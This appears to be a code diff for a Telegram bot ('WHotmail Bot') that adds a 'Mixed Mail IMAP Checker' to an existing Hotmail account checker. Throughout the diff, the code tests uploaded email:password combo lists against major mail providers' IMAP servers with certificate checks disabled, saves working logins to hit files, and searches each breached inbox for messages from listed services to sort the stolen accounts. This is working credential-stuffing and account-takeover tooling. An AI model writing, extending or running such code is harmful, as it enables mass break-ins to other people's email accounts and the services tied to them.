import zipfile
import requests
import pycountry
import ssl
import imaplib
import socket
from email.header import decode_header
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock, Semaphore
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.error import BadRequest
@@ -176,6 +181,21 @@ def is_authorized(user_id):
        return datetime.now() < expiry
    return False

# IMAP domain mappings
IMAP_DOMAINS = {
    'gmail.com': {'server': 'imap.gmail.com', 'port': 993},
    'yahoo.com': {'server': 'imap.mail.yahoo.com', 'port': 993},
    'outlook.com': {'server': 'outlook.office365.com', 'port': 993},
    'hotmail.com': {'server': 'outlook.office365.com', 'port': 993},
    'aol.com': {'server': 'imap.aol.com', 'port': 993},
    'icloud.com': {'server': 'imap.mail.me.com', 'port': 993},
}

def get_imap_server(domain):
    if domain in IMAP_DOMAINS:
        return IMAP_DOMAINS[domain]['server'], IMAP_DOMAINS[domain]['port']
    return f"imap.{domain}", 993

# --- Checker Logic ---
def get_capture(email, password, access_token, cid, selected_service=None, session_id=None):
    global service_hits
@@ -237,7 +257,89 @@ def get_capture(email, password, access_token, cid, selected_service=None, sessi
    except Exception as e:
        print(f"General capture error for {email}: {e}")

def _build_imap_or_query(senders):
    if not senders:
        return "(ALL)"
    if len(senders) == 1:
        return f'FROM "{senders[0]}"'
    return f'(OR FROM "{senders[0]}" {_build_imap_or_query(senders[1:])})'

def search_imap_inbox(imap_server, email, password, session_id):
    global service_hits
    try:
        # Select INBOX
        imap_server.select("INBOX", readonly=True)
        
        # We'll check for each service one by one or in small batches if OR is too complex
        # For simplicity and to match the Hotmail checker's per-service hit reporting, 
        # we'll search for each sender in the SERVICES dict.
        
        for service_name, service_info in SERVICES.items():
            if stop_checking: break
            sender = service_info["sender"]
            
            try:
                typ, data = imap_server.search(None, f'FROM "{sender}"')
                if typ == 'OK' and data[0]:
                    uids = data[0].split()
                    if uids:
                        # Service found! Save to file
                        output_path = os.path.join(HITS_DIR, session_id, service_info["file"])
                        os.makedirs(os.path.dirname(output_path), exist_ok=True)
                        with lock:
                            with open(output_path, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}\n")
                            service_hits[service_name] = service_hits.get(service_name, 0) + 1
            except:
                continue
    except:
        pass

def check_imap(email, password, session_id):
    try:
        domain = email.split('@')[1]
        server, port = get_imap_server(domain)
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with imaplib.IMAP4_SSL(host=server, port=port, ssl_context=context, timeout=15) as imap_server:
            typ, data = imap_server.login(email, password)
            if typ == 'OK':
                # Success! Save to Hits_IMAP.txt
                output_path = os.path.join(HITS_DIR, session_id, "Hits_IMAP.txt")
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                with lock:
                    with open(output_path, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    service_hits["IMAP"] = service_hits.get("IMAP", 0) + 1
                
                # Also save to Hits_All.txt
                all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
                with lock:
                    with open(all_hits_path, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                
                # NEW: Search inbox for keywords/senders like in the normal checker
                search_imap_inbox(imap_server, email, password, session_id)
                
                return "HIT"
            else:
                return "BAD"
    except Exception as e:
        # Check if it's a login failure vs a connection error
        err_str = str(e).lower()
        if "login failed" in err_str or "authentication failed" in err_str or "invalid credentials" in err_str:
            return "BAD"
        return "RETRY"

def check_account(email, password, selected_service=None, session_id=None):
    # Determine check mode
    if selected_service == "IMAP_CHECKER":
        return check_imap(email, password, session_id)
    
    # Existing Hotmail check logic
    try:
        session = requests.Session()
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
@@ -330,8 +432,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        return

    keyboard = [
        [InlineKeyboardButton("Check All Services", callback_data="mode_all")],
        [InlineKeyboardButton("Select Specific Service", callback_data="mode_select")]
        [InlineKeyboardButton("Check All Hotmail Services", callback_data="mode_all")],
        [InlineKeyboardButton("Hotmail Specific Service", callback_data="mode_select")],
        [InlineKeyboardButton("Mixed Mail IMAP Checker", callback_data="mode_imap")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome to WHotmail Bot!\nPlease select a check mode:", reply_markup=reply_markup)
@@ -362,7 +465,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if data == "mode_all":
        context.user_data["mode"] = "all"
        await query.edit_message_text("Mode set to: **All Services**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
        await query.edit_message_text("Mode set to: **All Hotmail Services**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
    elif data == "mode_imap":
        context.user_data["mode"] = "IMAP_CHECKER"
        await query.edit_message_text("Mode set to: **Mixed Mail IMAP Checker**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
    elif data == "mode_select":
        # Show category selection
        keyboard = []
